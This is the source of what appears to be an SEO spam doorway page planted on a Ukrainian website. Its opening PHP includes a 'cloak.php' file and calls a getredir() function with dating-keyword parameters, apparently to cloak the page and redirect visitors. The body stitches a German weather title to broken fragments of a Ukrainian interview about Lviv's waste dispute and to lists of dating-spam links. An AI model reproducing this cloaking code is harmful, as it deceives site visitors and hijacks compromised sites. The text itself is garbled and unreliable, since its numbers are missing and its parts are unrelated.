<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d1%88%d0%b2%d0%b8%d0%b4%d0%ba%d1%96%d1%81%d0%bd%d1%96+%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2%d0%b0+%d0%af%d0%b2%d0%be%d1%80%d1%96%d0%b2+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Wetter Jaworiw 7 tage. Online wettervorhersage in Jaworiw für eine Woche, Oblast Lwiw, Ukraine</title>
	<meta name="description" content="Від року — у складі незалежної України — триває розбудова держави, український культурний розвиток. З року спостерігалось стрімке." />
	<link rel="canonical" href="https://masage.od.ua/img/103/saqyt-shvidksn-znayomstva-yavorv.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/406/saqa-pdklyuchiti-sayti.php">підключити сайти в Кагарлик Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/471/nugu-plyus-rozmr.php">плюс розмір швидкості знайомств поблизу Жашків Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/457/wexu-veb-sayt-pdklyuchennya.php">веб-сайт підключення Ялта Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/137/pynot-shvidksne-znayomstvo.php">швидкісне знайомство на південь поблизу Долинська Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Швидкісні знайомства Яворів Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Здається, востаннє ми були разом на заході на Личаківському цвинтарі. Але ми з ним говорили не про публічні дискусії. Я сказав, що не хотів би разом дискутувати десь на телебаченні або в якійсь іншій програмі. Бо це неправильно. Наскільки я знаю, то його думка є такою ж. Так, Андрія Садового обурило, що ви самі написали проект ухвали для міськради з приводу передачі обласній адміністрації функцій вивозу та утилізації сміття.</p><strong><a id='w1'></a><h2>Інтерв'ю | ЛОДА/LODA – Львівська обласна державна адміністрація</h2></strong><p>А на представлення цієї ухвали покликали до себе в кабінет керівників всіх фракцій у міськраді, крім "Самопомочі". Під облдержадміністрацією стоять намети "Самопомочі" з вимогою зняти "сміттєву блокаду", — УП. А на нараду з керівниками фракцій чому їх не покликали? Але вважаю, що авторитарно можна керувати тільки тоді, коли приймаєш рішення і дуже чітко і послідовно його виконуєш.</p>
		
	<p>А до моменту прийняття рішення треба радитися, вислуховувати різні думки, заперечення. Інакше ти не зможеш прийняти виваженого рішення. Коли я запросив керівників фракцій, я запропонував їм своє бачення, як вирішити проблему. Мені здається, що це абсолютно нормально. Адже у вас теж є намір будувати заводи на Львівщині, але за рахунок інвесторів.</p><strong><a id='w2'></a><h2>Яворівський район</h2></strong><p>А без гарантованих обсягів сміття навряд чи інвестор візьметься за проект. Тому наша пропозиція в проекті ухвали дала б можливість підтвердити інвестору конкретний обсяг для будівництва. Для мене не принципово, в якому місті буде збудований завод — чи це область, чи Львів. Проте я не розумію, звідки у вас інформація стосовно будівництва сміттєпереробного заводу у Львові? Наскільки я знаю, на сьогодні немає ані проектної документації, ані тим паче прив'язки цієї проектної документації до земельної ділянки, ані підтвердженого фінансового ресурсу.</p>
<p>І дуже багато цієї брехні лунає з вуст очільників міської влади. Це брехня про блокаду, про меморандум, який нібито не працює, про ультиматуми. Так само це брехня про кредит  погодження якого, за версією Садового, затримують в Кабміні, — УП. Хто хоч один раз працював з європейськими фінансовими установами, той розуміє, що така процедура насправді розтягується на декілька років.</p>
<p>І міський голова прекрасно розуміє, що нереально отримати ці кошти в му році. Тому це все неправда, якою стараються прикрити безгосподарність та безпомічність. Синютка: "Садовий неправдою старається прикрити безгосподарність та безпомічність" — Водночас, міська рада вже замовила харківській фірмі проектну документацію для заводу. Тобто щось-таки, та й робиться. І я не бачив. І ніяка харківська фірма зараз нічого не розробляє?</p><a id='w3'></a><h3>Графік роботи:</h3><p>Я не бачив ні харківської фірми, ні угод. Маю на увазі французьку фірму Egis, яка уже півроку працює у Львові над програмою поводження ТПВ у Львові, і в травні запропонувала будувати завод на території на ТЕЦ І з приводу цього я публічно і офіційно заявляв, що якщо хтось хоче списати близько тисяч євро  вартість робіт Egis, — УП  на визначення морфології твердих побутових відходів, визначення земельної ділянки, визначення технології побудови заводу і перекладу з української на англійську чи французьку мову проекту рекультивації Грибовицького сміттєзвалища — то я подам офіційну заяву в правоохоронні органи, що це є розкрадання.</p>
<p>Тому що я сто відсотків знаю, що це не коштує тисяч євро. Так само я можу вам написати перелік технологій переробки ТПВ, яких в світі є аж чотири.</p><strong><a id='w4'></a><h2>“За додаткові 589 мільйонів гривень відремонтуємо ще понад 10 важливих доріг”, – Юрій Бучко</h2></strong><p>То на скільки сотень тисяч євро я вже претендую?.. Це гроші, які отримує Україна. Я не хочу, щоб хтось вважав українців злодіями. Виякось натякали, що Львів продукує значно менше, ніж тон сміття, про які заявляє міська рада і на вивіз яких виділяються кошти. І це суттєво відрізняється від  Цифра в тонн ніким не підтверджена. На нараді з перевізниками я озвучив одне з перших завдань — це стовідсотковий облік вивозу твердих побутових відходів. Тому що без обліку говорити про витрачання коштів чи взагалі про якісь цифри неправильно.</p>
		
			<br><ol>
			
				<li>фотографії знайомств в Інтернеті Зміїв Україна.</li>
			
				<li>знайомства понад 50 в Вараш Україна.</li>
			
				<li>Новини Львівської обласної державної адміністрації.</li>
			
				<li>Яворів — Вікіпедія;</li>
			
				<li>ЗЗСО - Яворівський район - Львівська область. ІСУО!</li>
			
				<li>просто знайомства поруч Нововолинськ Україна?</li>
			
				<li>місто знайомств в Свалява Україна.</li>
			
			</ol>
		
	<p>Я думаю, протягом місяця ми зможемо точно сказати, скільки сміття вивозиться зі Львова. Бо зараз, наприклад, перевізники, на моє запитання, скільки ви вивозите сміття, сумарно мені нарахували тонн. На що я їм сказав: "Друзі, ну, це ж неправда". Адже чим більше декларується вивіз сміття, тим більше коштів на це виділяється.</p>
<p>Ви якось озвучували факти, коли машина, яка за документами везла сміття на Дніпропетровщину, висипала його на Львівщині. Для вас зрозуміло, хто стоїть за цією схемою —перевізники чи мерія? Документи виписуються і гроші платяться за вивіз на одну відстань, а реально вивозиться на зовсім іншу відстань. Різницю хтось кладе в кишеню. Але хто кладе в кишеню, за якими домовленостями — хай вирішують правоохоронні органи.</p>
<p>У львівській мерії нам прокоментували, що після передачі повноважень з вивозу сміття виконавчій вертикалі тепер водіїв уже не зупиняють правоохоронці і не повертають з документами назад. Мовляв, ось вам і докази, що раніше була блокада. Але жодного такого факту не було названо. Це записано в протоколі засідання комісії. Також міський голова відповів, що в нього нема зауважень до керівника Національної поліції у Львівській області, який теж був присутній на комісії. А той сюжет, який показав "24 канал"  канал належить дружині Садового, — УП  про те, що в Донецькій області не пустили автомобіль, то це — велика провокація.</p>
<p>Там їхала машина, яка зареєстрована на одну компанію, а тягач і кузов — на іншу, накладна на сміття була виписане на третю компанію, а у водія були документи ще на іншу компанію. Ви уявіть собі ситуацію, у якій опинився правоохоронець? Якщо він на пості пропускає цю машину, тоді він потенційний злочинець. Люди не хочуть бачити в себе львівське сміття. Як ви плануєте вирішувати питання, коли люди перекривають заїзди на полігон, навіть пропри рішення Держкомісії?</p>
<p>Як цебуло, наприклад, 24 червня у Миколаєві Львівської області. Оскільки він не може впоратися з поставленим завданням і виконати рішення комісії з надзвичайних ситуацій. Коли у нас буде щось горіти, ми не будемо дивитися, хто за, хто проти. Нам просто треба буде гасити пожежу. Але якщо голова РДА не має поваги і розуміння серед громади, то він не може бути керівником. З іншого боку, ситуація дійсно є дуже складною. Днями були проблеми в Червонограді, перед цим — в Стрию.</p>
<p>Ми маємо величезну недовіру з боку людей. Тому що, по-перше, людей дуже часто обдурювали, а, по-друге — їх підбурювали. Навіть збирав підписи. Про це мені доповідали очільники Миколаївського району. А сенс?..</p>
		
	<p>Бо в суспільстві ображених і гнаних люблять. З якими областями плануєте домовлятися про вивіз? Для цього я поїду в інші області, особисто буду говорити з мерами та головами обласних адміністрацій.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/335/nopaw-sluzhba-znayomstv.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/240/wij-naykrash-dodatki.php">найкращі додатки для знайомств місто поруч Гребінка Україна</a></li><li><a href="https://masage.od.ua/img/422/mihif-pdklyuchiti-sayt.php">підключити сайт в Покров Україна</a></li><li><a href="https://masage.od.ua/img/137/vibav-naykrash-mstsya.php">найкращі місця знайомств Лисичанськ Україна</a></li><li><a href="https://masage.od.ua/img/406/qole-naykrash-programi-dlya.php">найкращі програми для знайомств місто в Звенигородка Україна</a></li><li><a href="https://masage.od.ua/img/196/sokuz-naykrashiy-trener-znayomstv.php">найкращий тренер знайомств Соснівка Україна</a></li><li><a href="https://masage.od.ua/img/428/zepo-studentsk-shvidksn-znayomstva.php">студентські швидкісні знайомства поблизу Маріуполь Україна</a></li><li><a href="https://masage.od.ua/img/184/putev-prosto-obdn.php">просто обідні побачення поруч Вознесенівка Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Articles</h2>
				<ol><li><a href='#w1'>Інтерв'ю | ЛОДА/LODA – Львівська обласна державна адміністрація</a></li>
<li><a href='#w2'>Яворівський район</a></li>
<li><a href='#w3'>Графік роботи:</a></li>
<li><a href='#w4'>“За додаткові 589 мільйонів гривень відремонтуємо ще понад 10 важливих доріг”, – Юрій Бучко</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/418/sota-sayt-znayomstv.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>